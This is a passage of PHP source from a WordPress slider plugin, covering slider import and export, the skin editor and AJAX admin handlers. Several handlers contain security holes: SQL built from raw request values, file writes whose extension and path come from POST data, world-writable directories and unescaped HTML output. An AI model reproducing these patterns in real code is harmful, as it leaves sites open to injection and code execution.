						array('%d', '%s', '%s', '%s', '%d', '%s', '%d', '%s'));
					}
				}
			}			
			
			// create the slider XML file
			sliderpro_slider_generate_xml($sliderpro_current_slider_id);
			
			$sliderpro_current_action = 'edit';
		}
		
		
		// delete the slider and slides from the database
		if ($sliderpro_current_action == 'delete' && wp_verify_nonce($_GET['_wpnonce'], 'delete-slider')) {
			$wpdb->query("DELETE FROM " . $wpdb->prefix . "sliderpro_slides WHERE slider_id = $sliderpro_current_slider_id");
			$wpdb->query("DELETE FROM " . $wpdb->prefix . "sliderpro_sliders WHERE id = $sliderpro_current_slider_id");
		}
		
		
		// duplicate the slider
		if ($sliderpro_current_action == 'duplicate_slider' && wp_verify_nonce($_GET['_wpnonce'], 'duplicate-slider')) {
			$slider = sliderpro_get_slider($sliderpro_current_slider_id);
			
			$wpdb->insert($wpdb->prefix . 'sliderpro_sliders', array('name' => $slider['name'], 
				'settings' => serialize($slider['settings']),
				'created' => date('m-d-Y'), 
				'modified' => date('m-d-Y'),
				'panels_state' => serialize($slider['panels_state'])), 
			array('%s', '%s', '%s', '%s', '%s'));
			
			$new_id = $wpdb->insert_id;
			
			// duplicate the slides
			$slides = sliderpro_get_slides($sliderpro_current_slider_id);
			
			foreach ($slides as $slide) {
				$wpdb->insert($wpdb->prefix . 'sliderpro_slides', array('slider_id' => $new_id,
					'name' => $slide['name'],
					'settings' => $slide['settings'],
					'content' => $slide['content'],
					'position' => $slide['position'],
					'panel_state' => $slide['panel_state'],
					'selected_tab' => $slide['selected_tab'],
					'visibility' => $slide['visibility']),
				array('%d', '%s', '%s', '%s', '%d', '%s', '%d', '%s'));
			}		
			
			// create the slider XML file
			sliderpro_slider_generate_xml($new_id);
		}
		
		
		// import a slider
		if (isset($_POST['import-slider-submit'])) {
			check_admin_referer('import-slider-submit', 'import-slider-nonce');
			
			$xml = new DOMDocument();
			$xml->preserveWhiteSpace = false;
			$xml->load($_FILES['import-slider-file']['tmp_name']);
			
			$main = $xml->documentElement;
			
			// get the name of the slider
			$name = $main->getElementsByTagName('name')->item(0)->nodeValue;
			
			// get the sidebar panels state
			foreach ($main->getElementsByTagName('panels_state')->item(0)->childNodes as $element) {
				$panels_state[$element->nodeName] = $element->nodeValue;
			}
			
			// get the global settings of the slider
			foreach ($main->getElementsByTagName('settings')->item(0)->childNodes as $element) {
				$settings[$element->nodeName] = $element->nodeValue;
			}		
			
			
			// add the slider to the database
			$wpdb->insert($wpdb->prefix . 'sliderpro_sliders', array('name' => $name, 
				'settings' => serialize($settings),
				'created' => date('m-d-Y'), 
				'modified' => date('m-d-Y'),
				'panels_state' => serialize($panels_state)), 
			array('%s', '%s', '%s', '%s', '%s'));
			$sliderpro_current_slider_id = $wpdb->insert_id;
			
			
			$custom_css = $main->getElementsByTagName('custom_css')->item(0);
			
			if ($custom_css) {
				$custom_css_value = $custom_css->nodeValue;
				
				$css_file_path = WP_PLUGIN_DIR . '/slider-pro/custom/slider-pro-' . $sliderpro_current_slider_id . '/slider-pro-' . $sliderpro_current_slider_id . '-custom-css.css';

				if(!file_exists(dirname($css_file_path)))
					mkdir(dirname($css_file_path), 0777, true);
				
				file_put_contents($css_file_path, stripslashes($custom_css_value));
			}
			
			
			$custom_js = $main->getElementsByTagName('custom_js')->item(0);
			
			if ($custom_js) {
				$custom_js_value = $custom_js->nodeValue;
				
				$js_file_path = WP_PLUGIN_DIR . '/slider-pro/custom/slider-pro-' . $sliderpro_current_slider_id . '/slider-pro-' . $sliderpro_current_slider_id . '-custom-js.js';

				if(!file_exists(dirname($js_file_path)))
					mkdir(dirname($js_file_path), 0777, true);
				
				file_put_contents($js_file_path, stripslashes($custom_js_value));
			}
			
			
			foreach ($main->getElementsByTagName('slides')->item(0)->childNodes as $slide) {
				// get the name of the slide
				$name = $slide->getElementsByTagName('name')->item(0)->nodeValue;
				// get the position
				$position = $slide->getElementsByTagName('position')->item(0)->nodeValue;
				// get the panel state
				$panel_state = $slide->getElementsByTagName('panel_state')->item(0)->nodeValue;
				// get the selected tab
				$selected_tab = $slide->getElementsByTagName('selected_tab')->item(0)->nodeValue;
				// get the visibility
				$visibility = $slide->getElementsByTagName('visibility')->item(0)->nodeValue;				
				
				
				$slide_settings = array();
				
				// get the slide settings
				foreach ($slide->getElementsByTagName('settings')->item(0)->childNodes as $element) {
					$slide_settings[$element->nodeName] = $element->nodeValue;
				}
				
				
				$slide_content = array();
				
				// get the slide content
				foreach ($slide->getElementsByTagName('content')->item(0)->childNodes as $element) {
					$slide_content[$element->nodeName] = $element->nodeValue;
				}
				
				// add the slide to the database
				$wpdb->insert($wpdb->prefix . 'sliderpro_slides', array('slider_id' => $sliderpro_current_slider_id,
					'name' => $name,
					'settings' => serialize($slide_settings),
					'content' => serialize($slide_content),
					'position' => $position,
					'panel_state' => $panel_state,
					'selected_tab' => $selected_tab,
					'visibility' => $visibility),
				array('%d', '%s', '%s', '%s', '%d', '%s', '%d', '%s'));
				
				unset($slide_settings);
				unset($slide_content);
			}
			
			// create the slider XML file
			sliderpro_slider_generate_xml($sliderpro_current_slider_id);
		}
		
	}
	
	
	// add the slider pro button in the tinyMCE editor
	if (current_user_can('edit_posts') && current_user_can('edit_pages')) {
		add_filter('mce_external_plugins', 'sliderpro_add_tinymce_plugin');
		add_filter('mce_buttons', 'sliderpro_register_tinymce_button');
	}
}


function sliderpro_register_tinymce_button($buttons) {
	array_push($buttons, 'separator', 'sliderpro');
	return $buttons;
}


function sliderpro_add_tinymce_plugin($plugin_array) {
	$plugin_array['sliderpro'] = plugins_url('/slider-pro/js/editor-plugin.js');
	return $plugin_array;
}


/**
* Returns all the post data, including post types, taxonomies, terms etc.
*/
function sliderpro_get_posts_data() {
	$posts_data = array();
	
	// get all the important post types
	$post_types = get_post_types('', 'objects');
	$exclude_post_types = array('attachment', 'revision', 'nav_menu_item', 'mediapage');
	
	$posts_data['post_types'] = array();
	$posts_data['taxonomies'] = array();		
	$post_types_names = array();
	
	// loop through all post types
	foreach ($post_types as $post_type) {
		if (in_array($post_type->name, $exclude_post_types))
			continue;
		
		// add post type to array
		$posts_data['post_types'][$post_type->name] = array('post_name' => $post_type->name, 
			'post_label' => $post_type->label, 
			'post_taxonomies' => get_object_taxonomies($post_type->name));

		array_push($post_types_names, $post_type->name);
	}
	
	// get the taxonomies for all post types
	$taxonomies = get_object_taxonomies($post_types_names, 'objects');
	
	// loop through all taxonomies
	foreach ($taxonomies as $taxonomy) {
		// get terms for taxonomy
		$terms = get_terms($taxonomy->name, 'objects');			
		$taxonomy_terms = array();
		
		// loop through all terms
		foreach ($terms as $term)
			$taxonomy_terms[$term->name] = array('term_name' => $term->name, 
				'term_slug' => $term->slug, 
				'term_complete' => $taxonomy->name . '|' . $term->slug);
		
		// add taxonomy to array
		$posts_data['taxonomies'][$taxonomy->name] = array('taxonomy_name' => $taxonomy->name, 
			'taxonomy_label' => $taxonomy->label, 
			'taxonomy_terms' => $taxonomy_terms);
	}
	
	return $posts_data;
}



function sliderpro_get_individual_slide_settings() {
	global $sliderpro_slide_settings;
	$individual_slide_settings = array();
	
	foreach ($sliderpro_slide_settings as $key => $value) {
		$group = $value['group'];
		
		if (!isset($individual_slide_settings[$group]))
			$individual_slide_settings[$group] = array();
		
		array_push($individual_slide_settings[$group], $key);
	}	
	
	return $individual_slide_settings;
}


/**
* Create the UI for the Sliders and Add New pages
*/
function sliderpro_sliders_ui() {
	global $sliderpro_current_action, $sliderpro_current_slider_id;
	
	$slider;
	$slides;	
	$action = $sliderpro_current_action;
	$slider_id = $sliderpro_current_slider_id;

	if ($sliderpro_current_action == 'delete') {		
		// display the Sliders page	
		include('includes/sliders.php');		
	} else if ($sliderpro_current_action == 'edit') {		
		// load the updated slider and also load all the slides of the updated slider
		$slider = sliderpro_get_slider($slider_id);
		
		if (!$slider) {
			echo '<div id="message" class="updated"><p>' . __('The slider doesn\'t exist.', 'slider_pro') . '</p></div>';
			return;
		}
		
		$slides = sliderpro_get_slides($slider_id);
		$slider_settings = $slider['settings'];
		
		// display the Edit Slider page	
		include('includes/slider.php');
	} else {
		// display the Sliders page	
		include('includes/sliders.php');	
	}
}


/**
* Create the UI for the Add New page
*/
function sliderpro_add_new_ui() {
	global $sliderpro_current_action;
	$action = $sliderpro_current_action;
	$slider = NULL;
	$slider_settings = NULL;
	
	include('includes/slider.php');
}


/**
* Create the UI for the Skin Editor page
*/
function sliderpro_skin_editor_ui() {
	// set the default value to 'pixel', which is the default skin
	$current_skin = "pixel";
	
	// get the chosen skin
	if (isset($_POST['skin_selector'])) {
		$current_skin = $_POST['skin_selector'];
	}
	
	
	if (isset($_POST['replicate_skin'])) {
		check_admin_referer('replicate-skin-submit', 'replicate-skin-nonce');
		
		// get the class of the new skin
		$skin_class = $_POST['replicate-skin-class'];
		$current_skin = $skin_class;
		
		// create the new header
		$new_header = '/*' . PHP_EOL .
		SP_IND_1 . 'Skin Name: ' . $_POST['replicate-skin-name'] . PHP_EOL .
		SP_IND_1 . 'Class: ' . $_POST['replicate-skin-class'] . PHP_EOL .
		SP_IND_1 . 'Description: ' . $_POST['replicate-skin-description'] . PHP_EOL .
		SP_IND_1 . 'Author: ' . $_POST['replicate-skin-author'] . PHP_EOL .
		'*/';
		
		$origin_skin = sliderpro_get_skin_by_class($_POST['skin']);		
		$origin_skin_dir = $origin_skin['container_dir'];
		$origin_skin_class = $origin_skin['class'];
		
		$type = $origin_skin['type'];
		$destination_dir = WP_PLUGIN_DIR . '/slider-pro/skins/' . $type;		
		$new_skin_url = plugins_url('slider-pro/skins/' . $type . '/' . $skin_class . '/' . $skin_class . '.css');
		$new_skin_path = $destination_dir . '/' . $skin_class . '/' . $skin_class . '.css';		
		
		// copy all the files
		$success = sliderpro_replicate_skin_dir($origin_skin_dir, $destination_dir, $skin_class, $origin_skin_class, $new_header);
		
		if ($success) {
			// create the skin object and add it to the array of skins
			$new_skin = array();
			$new_skin = sliderpro_get_skin_meta($new_skin_path);
			$new_skin['name'] = $new_skin['Skin Name'];
			$new_skin['class'] = $new_skin['Class'];
			$new_skin['description'] = $new_skin['Description'];
			$new_skin['author'] = $new_skin['Author'];
			$new_skin['url'] = $new_skin_url;
			$new_skin['path'] = $new_skin_path;
			$new_skin['container_dir'] = $destination_dir . '/' . $skin_class;
			$new_skin['type'] = $type;
			
			global $sliderpro_all_skins;
			array_push($sliderpro_all_skins, $new_skin);
			
			sliderpro_refresh_skins(array($type));
		} else {
			$current_skin = "pixel";
		}
	}
	
	
	//get the skin object by name
	$skin = sliderpro_get_skin_by_class($current_skin);
	
	// get the path of the skin
	$skin_path = $skin['path'];
	
	// if the skin was updated write the updated content to the file		
	if (isset($_POST['update_skin'])){
		check_admin_referer('skin-editor-update', 'skin-editor-nonce');
		
		$updated_content = $_POST['skin_content'];
		
		if (is_writable($skin_path)) {
			file_put_contents($skin_path, stripslashes($updated_content));
			sliderpro_refresh_skins(array($skin['type']));
		}	
	}

	// read the content at the chosen path	
	if (is_file($skin_path))
		$skin_content = file_get_contents($skin_path);
	
	// get the data of the skin
	$skin_author = $skin['author'];
	$skin_description = $skin['description'];
	$skin_name = $skin['name'];
	
	// display the Skin Editor page
	include('includes/skin-editor.php');	
}


/**
* Create the UI for the Plugin Options page
*/
function sliderpro_plugin_options_ui() {
	if (isset($_POST['plugin_options_update'])) {
		check_admin_referer('plugin-options-update', 'plugin-options-nonce');		
		
		if (isset($_POST['slider_pro_enable_timthumb']))
			update_option('slider_pro_enable_timthumb', true);
		else
			update_option('slider_pro_enable_timthumb', false);			
		
		if (isset($_POST['slider_pro_use_compressed_scripts']))
			update_option('slider_pro_use_compressed_scripts', true);
		else
			update_option('slider_pro_use_compressed_scripts', false);

		if (isset($_POST['slider_pro_progress_animation']))
			update_option('slider_pro_progress_animation', true);
		else
			update_option('slider_pro_progress_animation', false);

		if (isset($_POST['slider_pro_show_admin_bar_links']))
			update_option('slider_pro_show_admin_bar_links', true);
		else
			update_option('slider_pro_show_admin_bar_links', false);							

		if (isset($_POST['slider_pro_enqueue_jquery']))
			update_option('slider_pro_enqueue_jquery', true);
		else
			update_option('slider_pro_enqueue_jquery', false);

		if (isset($_POST['slider_pro_enqueue_bundled_jquery']))
			update_option('slider_pro_enqueue_bundled_jquery', true);
		else
			update_option('slider_pro_enqueue_bundled_jquery', false);
		
		if (isset($_POST['slider_pro_enqueue_jquery_easing']))
			update_option('slider_pro_enqueue_jquery_easing', true);
		else
			update_option('slider_pro_enqueue_jquery_easing', false);			

		if (isset($_POST['slider_pro_enqueue_jquery_mousewheel']))
			update_option('slider_pro_enqueue_jquery_mousewheel', true);
		else
			update_option('slider_pro_enqueue_jquery_mousewheel', false);

		if (isset($_POST['slider_pro_generate_xml_file']))
			update_option('slider_pro_generate_xml_file', true);
		else
			update_option('slider_pro_generate_xml_file', false);

		if (isset($_POST['slider_pro_role_access']))
			update_option('slider_pro_role_access', $_POST['slider_pro_role_access']);
	}	
	
	include('includes/plugin-options.php');
}


/**
* Create the UI for the Help page
*/
function sliderpro_help_ui() {	
	include('includes/help/help.php');
}


/**
* Create the UI for the sidebar meta box that will be added to the posts pages
*/
function sliderpro_feature_box_ui() {
	global $post;
	
	include('includes/feature-box.php');
}


/**
* Saves Slider PRO specific meta from post/pages
*/
function sliderpro_save_post_meta($post_id) {	
	if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) 
		return;

	if (isset($_POST['slider-pro-feature-box-nonce']) && !empty($_POST['slider-pro-feature-box-nonce']))	
		check_admin_referer('slider-pro-feature-box-update', 'slider-pro-feature-box-nonce');
	
	if (isset($_POST['slider-pro-featured-post']) && !empty($_POST['slider-pro-featured-post']))
		update_post_meta($post_id, '_sliderpro-featured', true);
	else 
		delete_post_meta($post_id, '_sliderpro-featured');
}


/**
* Return the slider based of the specified ID
*/
function sliderpro_get_slider($id) {
	global $wpdb;
	$table_name = $wpdb->prefix . 'sliderpro_sliders';
	$slider_raw = $wpdb->get_row("SELECT * FROM $table_name WHERE id = $id", ARRAY_A);
	
	if ($slider_raw){
		$slider['name'] = $slider_raw['name'];
		$slider['settings'] = unserialize($slider_raw['settings']);
		$slider['panels_state'] = unserialize($slider_raw['panels_state']);
		return $slider;
	} else {
		return false;	
	}
}


/**
* Return the slides based of the specified ID
*/
function sliderpro_get_slides($id) {
	global $wpdb;
	$table_name = $wpdb->prefix . 'sliderpro_slides';
	$slides = $wpdb->get_results("SELECT * FROM $table_name WHERE slider_id = $id ORDER BY position", ARRAY_A);
	
	return $slides;
}


/**
* Return the value of a slider's setting
*/
function sliderpro_get_setting($slider_settings, $setting_name) {
	$value;
	
	// if the specified slider exists, get its value
	if (isset($slider_settings) && isset($slider_settings[$setting_name])) {
		$value = $slider_settings[$setting_name];
		
	} else { // else get the default value for that setting
		global $sliderpro_slider_settings;
		
		$value = $sliderpro_slider_settings[$setting_name]['default_value'];	
	}
	
	return $value;
}


/**
* Return the value of a slides' setting
*/
function sliderpro_get_slide_setting($slide_settings, $setting_name, $setting_type = '') {
	$value;
	
	if (isset($slide_settings) && isset($slide_settings[$setting_name])) {
		$value = $slide_settings[$setting_name];
		
	} else {
		global $sliderpro_slide_settings, $sliderpro_slide_extra_settings, $sliderpro_slide_dynamic_settings;
		
		if ($setting_type == 'extra')
			$value = $sliderpro_slide_extra_settings[$setting_name];
		else if ($setting_type == 'dynamic')
			$value = $sliderpro_slide_dynamic_settings[$setting_name];
		else
			$value = $sliderpro_slide_settings[$setting_name]['default_value'];
	}
	
	return $value;
}


/**
* Return the slides' content (can be html, caption, tooltip caption etc)
*/
function sliderpro_get_slide_content($slide_content, $content_name, $stripslashes = false, $html_decode = false) {
	$content = (isset($slide_content) && isset($slide_content[$content_name])) ? $slide_content[$content_name] : '';

	return $content != '' ? sliderpro_decode($content, $stripslashes, $html_decode) : '';
}


/**
* Decode
*/
function sliderpro_decode($content, $stripslashes = false, $html_decode = false) {
	if ($stripslashes)
		$content = stripslashes($content);

	if ($html_decode)
		$content = htmlspecialchars_decode($content);

	return $content;
}


/**
* Return the panel's state (opened/closed)
*/
function sliderpro_get_panels_state($slider, $panel_name) {
	$state;
	
	if (isset($slider))
		$state = isset($slider['panels_state'][$panel_name]) ? $slider['panels_state'][$panel_name] : 'closed';
	else 
		$state = ($panel_name == 'publish' || $panel_name == 'general') ? 'opened' : 'closed';

	return $state;
}


/**
* Return the list of available settings for a slider
*/
function sliderpro_get_settings_list($list) {
	global $sliderpro_slider_settings_lists;
	
	return $sliderpro_slider_settings_lists[$list];
}


/**
* Return the shortname for a setting
*/
function sliderpro_get_settings_pretty_name($name) {
	global $sliderpro_settings_pretty_name;
	
	if (isset($sliderpro_settings_pretty_name[$name]))
		return $sliderpro_settings_pretty_name[$name];
	else
		return $name;
}


/**
* Add a new slide, using AJAX
*/
function sliderpro_add_new_slides() {
	$counter = $_GET['counter'];
	$quantity = $_GET['quantity'];
	
	$is_slide = false;
	$slide_content = NULL;
	$slide_settings = NULL;
	
	global $sliderpro_slide_settings;
	$individual_slide_settings = sliderpro_get_individual_slide_settings();
	
	for ($i = 0; $i < $quantity; $i++) {
		include('includes/slide.php');
		$counter++;
	}
	
	die();
}


/**
* Duplicate a slide, using AJAX
*/
function sliderpro_duplicate_slide() {
	$counter = $_GET['counter'];
	$id = $_GET['id'];
	
	$is_slide = false;
	$slide_content = NULL;
	$slide_settings = NULL;
	
	$posts_data = sliderpro_get_posts_data();
	
	global $sliderpro_slide_settings;
	$individual_slide_settings = sliderpro_get_individual_slide_settings();
	
	if ($id != -1) {
		global $wpdb;
		$table_name = $wpdb->prefix . 'sliderpro_slides';
		$slide = $wpdb->get_row("SELECT * FROM $table_name WHERE id = $id", ARRAY_A);
		
		$is_slide = true;
		$slide['id'] = -1;
		$slide_content = unserialize($slide['content']);
		$slide_settings = unserialize($slide['settings']);
	}
	
	include('includes/slide.php');
	
	die();
}



/**
* Refresh slider settings 
*/
function sliderpro_show_slider_settings() {
	$settings = explode('|', $_GET['settings']);	
	
	foreach ($settings as $key => $value)
		echo sliderpro_create_slider_setting_field($value, 'default');
	
	die();
}


/**
* Add individual settings to a slide
*/
function sliderpro_show_slide_settings() {
	$counter = $_GET['counter'];
	$settings = explode('|', $_GET['settings']);	
	
	foreach ($settings as $key => $value)
		echo sliderpro_create_slide_setting_field($value, 'default', $counter);
	
	die();
}


/**
* Create a slider setting field
*/
function sliderpro_create_slider_setting_field($setting_name, $setting_value) {
	global $sliderpro_slider_settings;
	$setting = $sliderpro_slider_settings[$setting_name];
	$value = $setting_value == 'default' ? $setting['default_value'] : $setting_value;
	
	$setting_field_name = '';
	$setting_field_control = '';
	
	$setting_field_name = '<label title="' . $setting_name . '">' . $setting['name'] . '</label>';
	
	if ($setting['type'] == 'text') {
		$setting_field_control .= '<input name="slider_settings[' . $setting_name . ']" type="text" value="' . $value . '"/>';
	} else if ($setting['type'] == 'checkbox') {
		$checked = $value == true ? ' checked="checked"' : '';
		$setting_field_control .= '<input name="slider_settings[' . $setting_name . ']" type="hidden" value="0"/>';
		$setting_field_control .= '<input name="slider_settings[' . $setting_name . ']" type="checkbox" value="1"' . $checked . '/>';
	} else if ($setting['type'] == 'color') {
		$setting_field_control .= '<input name="slider_settings[' . $setting_name . ']" type="hidden" value="' . $value . '"/>';
		$setting_field_control .= '<input type="button" class="sp-color-picker"/>';
	} else if ($setting['type'] == 'select') {
		$setting_field_control .= '<select name="slider_settings[' . $setting_name . ']">';
		
		$list = sliderpro_get_settings_list($setting['list']);
		
		foreach ($list as $entry) {
			$selected = $value == $entry ? ' selected="selected"' : '';
			$setting_field_control .= '<option value="' . $entry . '"' . $selected . '>' . sliderpro_get_settings_pretty_name($entry) . '</option>';
		}
		
		$setting_field_control .= '</select>';
	} else if ($setting['type'] == 'function') {
		$setting_field_control .= call_user_func($setting['function_name'], $value);
	}
	
	$setting_field = '<tr class="setting-field" id="' . $setting_name . '"><td>' . $setting_field_name . '</td><td>' . $setting_field_control . '</td></tr>';
	
	return $setting_field;
}


/**
* Create a slide setting field
*/
function sliderpro_create_slide_setting_field($setting_name, $setting_value, $counter) {
	global $sliderpro_slide_settings;
	$setting = $sliderpro_slide_settings[$setting_name];
	$value = $setting_value == 'default' ? $setting['default_value'] : $setting_value;
	
	$setting_field_name = '';
	$setting_field_control = '';
	
	$setting_field_name = '<label title="' . $setting_name . '"><span>' . __($setting['name'], 'slider_pro') . '</span>';

	if ($setting['type'] == 'text') {
		$setting_field_control .= '<input name="slide[' . $counter . '][settings][' . $setting_name . ']" type="text" value="' . $value . '"/>';
	} else if ($setting['type'] == 'checkbox') {
		$checked = $value == true ? ' checked="checked"' : '';
		$setting_field_control .= '<input name="slide[' . $counter . '][settings][' . $setting_name . ']" type="hidden" value="0"/>';
		$setting_field_control .= '<input name="slide[' . $counter . '][settings][' . $setting_name . ']" type="checkbox" value="1"' . $checked . '/>';
	} else if ($setting['type'] == 'color') {
		$setting_field_control .= '<input name="slide[' . $counter . '][settings][' . $setting_name . ']" type="hidden" value="' . $value . '"/>';
		$setting_field_control .= '<input type="button" class="sp-color-picker"/>';
	} else if ($setting['type'] == 'select') {
		$setting_field_control .= '<select name="slide[' . $counter . '][settings][' .$setting_name . ']">';
		
		$list = sliderpro_get_settings_list($setting['list']);
		
		foreach ($list as $entry) {
			$selected = $value == $entry ? ' selected="selected"' : '';
			$setting_field_control .= '<option value="' . $entry . '"' . $selected . '>' . sliderpro_get_settings_pretty_name($entry) . '</option>';
		}
		
		$setting_field_control .= '</select>';
	} 
	
	$setting_field = '<tr class="setting-field" id="' . $setting_name . '"><td>' . $setting_field_name . '</td><td>' . $setting_field_control . '</td></tr>';
	
	return $setting_field;
}



/**
* Returns the list of scrollbar skins
*/
function sliderpro_get_scrollbar_skin($value) {
	global $sliderpro_scrollbar_skins;
	$select_box = '';
	
	//sort the array of skins alphabetically based on the skin's name
	usort($sliderpro_scrollbar_skins, "sliderpro_compare_skin_names");
	
	$select_box .= '<select name="slider_settings[scrollbar_skin]">';
	
	foreach ($sliderpro_scrollbar_skins as $skin) {                        
		$selected = $skin['class'] == $value ? 'selected="selected"' : '';
		$select_box .= "<option value=\"" . $skin['class'] . "\" $selected>" . $skin['name'] . "</option>";
	}
	
	$select_box .= '</select>';
	
	return $select_box;
}


/**
* Create the posts data fields
*/
function sliderpro_add_dynamic_fields() {
	$counter = $_GET['counter'];
	$slide_type = $_GET['slide_type'];
	
	$slide_settings = NULL;	
	
	if ($slide_type == 'posts') {
		$posts_data = sliderpro_get_posts_data();
		include('includes/posts-data-fields.php');
	} else if ($slide_type == 'gallery') {
		include('includes/gallery-data-fields.php');
	}
	
	die();
}


/**
* Get the description of a property, using AJAX
*/
function sliderpro_get_help_text() {
	$title = $_GET['title'];	
	
	global $sliderpro_properties_help;	
	echo isset($sliderpro_properties_help[$title]) ? $sliderpro_properties_help[$title] : 'Not Available';
	
	die();
}


/**
* Preview the slider
*/
function sliderpro_slider_preview() {
	$id = $_GET['id'];
	
	echo slider_pro($id);	
	sliderpro_load_slider_scripts();
	
	die();
}


/**
* Show the available sliders in the tinyMCE plugin
*/
function sliderpro_tinymce_plugin() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'sliderpro_sliders';
	$sliders = $wpdb->get_results("SELECT id, name FROM $table_name");
	
	echo json_encode(stripslashes_deep($sliders));
	
	die();
}


/**
* Open the media lightbox
*/
function sliderpro_open_media() {	
	$images_total_height = $_GET['images_total_height'];
	$show_page = $_GET['show_page'];
	$show_date = $_GET['show_date'];
	$allow = $_GET['allow'];
	
	include('includes/media-loader.php');
	
	die();
}


/**
* Open the window for editing custom JS/CSS
*/
function sliderpro_edit_custom_js_css() {
	$id = $_GET['id'];
	$type = $_GET['type'];
	
	$initial_content = "";
	$file_type = $type == 'edit-custom-js' ? 'js' : 'css';
	$file_path = WP_PLUGIN_DIR . '/slider-pro/custom/slider-pro-' . $id . '/slider-pro-' . $id . '-custom-' . $file_type . '.' . $file_type;
	
	if (is_file($file_path)) {
		$initial_content = file_get_contents($file_path);
	}
	
	include('includes/edit-custom-js-css.php');
	
	die();
}


/**
* Save the custom JS/CSS
*/
function sliderpro_save_custom_js_css() {
	if (!wp_verify_nonce($_POST['_wpnonce'], 'custom-js-css-edit'))
		return;

	$id = $_POST['id'];
	$type = $_POST['type'];
	$content = $_POST['content'];
	
	$file_path = WP_PLUGIN_DIR . '/slider-pro/custom/slider-pro-' . $id . '/slider-pro-' . $id . '-custom-' . $type . '.' . $type;
	
	if(!file_exists(dirname($file_path)))
		mkdir(dirname($file_path), 0777, true);
	
	file_put_contents($file_path, stripslashes($content));
	
	die();
}


/**
* Replicate skin
*/
function sliderpro_replicate_skin() {
	$show_date = $_GET['skin'];
	
	include('includes/replicate-skin-form.php');
	
	die();
}


/**
* Refresh skin
*/
function sliderpro_refresh_all_skins() {
	sliderpro_refresh_skins(array('main', 'scrollbar'));
	
	echo admin_url('admin.php?page=slider_pro_skin_editor');
	
	die();
}


/**
* Import a slider
*/
function sliderpro_slider_import() {		
	include('includes/import-slider-form.php');	
	
	die();
}


/**
* Export the slider
*/
function sliderpro_slider_generate_xml($id) {
	if (!get_option('slider_pro_generate_xml_file'))
		return;

	global $blog_id;
	$slider_name;
	
	// load the slider and its slides
	$slider = sliderpro_get_slider($id);
	$slides = sliderpro_get_slides($id);
	
	// create the XML document
	$xml = new DOMDocument();
	$xml->formatOutput = true;
	
	$main = $xml->createElement('slider');
	$xml->appendChild($main);
	
	// parse the slider data and write it in the XML document
	foreach ($slider as $key => $value) {
		if (is_array($value)) {
			$slider_element = $xml->createElement($key);
			$main->appendChild($slider_element);
			
			foreach ($value as $key2 => $value2) {
				$element = $xml->createElement($key2, $value2);
				$slider_element->appendChild($element);
			}
		} else {
			if ($key == 'name') {
				$slider_name = $value;
				$slider_element = $xml->createElement($key);
				$cdata_value = $xml->createCDATASection($value);
				$slider_element->appendChild($cdata_value);
				$main->appendChild($slider_element);
			} else {
				$slider_element = $xml->createElement($key, $value);
				$main->appendChild($slider_element);
			}
		}
	}
	
	
	$css_file_path = WP_PLUGIN_DIR . '/slider-pro/custom/slider-pro-' . $id . '/slider-pro-' . $id . '-custom-css.css';
	$js_file_path = WP_PLUGIN_DIR . '/slider-pro/custom/slider-pro-' . $id . '/slider-pro-' . $id . '-custom-js.js';
	
	
	if (is_file($css_file_path)) {
		$custom_css_content = file_get_contents($css_file_path);
		
		$slider_element = $xml->createElement('custom_css');
		$cdata_value = $xml->createCDATASection($custom_css_content);
		$slider_element->appendChild($cdata_value);
		$main->appendChild($slider_element);
	}
	
	
	if (is_file($js_file_path)) {
		$custom_js_content = file_get_contents($js_file_path);
		
		$slider_element = $xml->createElement('custom_js');
		$cdata_value = $xml->createCDATASection($custom_js_content);
		$slider_element->appendChild($cdata_value);
		$main->appendChild($slider_element);
	}
	
	
	// create the slides wrapper in the XML document
	$slides_wrapper = $xml->createElement('slides');
	$main->appendChild($slides_wrapper);
	
	// get each slide
	foreach ($slides as $slide) {
		$slide_instance = $xml->createElement('slide');
		$slides_wrapper->appendChild($slide_instance);
		
		// get each value or array(in the case of 'content' and 'settings')
		foreach($slide as $key => $value) {			
			if (is_serialized($value)) { // array/serialized data
				$unserialized_data = unserialize($value);
				
				$slide_instance_array_element = $xml->createElement($key);
				$slide_instance->appendChild($slide_instance_array_element);
				
				if ($key == 'content') {
					foreach ($unserialized_data as $key2 => $value2) {
						$slide_instance_element = $xml->createElement($key2);
						
						// put the content inside CDATA
						$cdata_value = $xml->createCDATASection($value2);
						$slide_instance_element->appendChild($cdata_value);
						$slide_instance_array_element->appendChild($slide_instance_element);
					}
				} else {
					foreach ($unserialized_data as $key2 => $value2) {
						$slide_instance_element = $xml->createElement($key2, $value2);
						$slide_instance_array_element->appendChild($slide_instance_element);
					}
				}
			} else { // simple value
				if ($key == 'name') {
					$slide_instance_element = $xml->createElement($key);
					$cdata_value = $xml->createCDATASection($value);
					$slide_instance_element->appendChild($cdata_value);
					$slide_instance->appendChild($slide_instance_element);
				} else {
					$slide_instance_element = $xml->createElement($key, $value);
					$slide_instance->appendChild($slide_instance_element);
				}
			}
		}
	}
	
	$name = (function_exists('is_multisite') && is_multisite()) ? $slider_name . ' (' . $blog_id . '-' . $id . ').xml' : $slider_name . ' (' . $id . ').xml';
	$path = WP_PLUGIN_DIR . '/slider-pro/xml/' . $name;
	$xml->save($path);
}


/**
* Create the Slider PRO
*/
function slider_pro($id, $atts = null, $content = null) {
	global $sliderpro_slider_settings, $sliderpro_unique_id, $sliderpro_used_ids, $sliderpro_scripts_to_load, $sliderpro_custom_scripts_to_load,
	$sliderpro_styles_to_load, $sliderpro_sliders_js, $sliderpro_lightbox_loaded, $sliderpro_videojs_loaded, $sliderpro_js_properties;
	
	// assign an ID for this slider
	// it will either be the based on the ID that the slider has in the database 
	// or, if that ID is already used in the same page, another unique ID will be assign
	$current_id = (in_array($id, $sliderpro_used_ids) || $id == -1) ? $sliderpro_unique_id-- : $id;
	array_push($sliderpro_used_ids, $current_id);
	
	// if id is -1, it means that an id was not specified and the slider will be created
	// based on shortcode data
	if ($id == -1) {
		$slides = array();
		
		$available_settings = array();
		
		foreach ($sliderpro_slider_settings as $key => $value)
			$available_settings[$key] = $value['default_value'];			
		
		// merge the values specified in the shortcode with the default ones
		$slider_settings = $atts ? array_merge($available_settings, $atts) : $available_settings;
	} else {
		// if an id was specified, load the slider
		$slider = sliderpro_get_slider($id);
		
		// if the slider does not exist, display a message
		if (!$slider)
			return "A slider with the ID of $id was not found.";
		
		// merge the values specified in the shortcode with the values specified for the slider in the admin area
		$slider_settings = $atts ? array_merge($slider['settings'], $atts) : $slider['settings'];
		
		// load the slider's slides
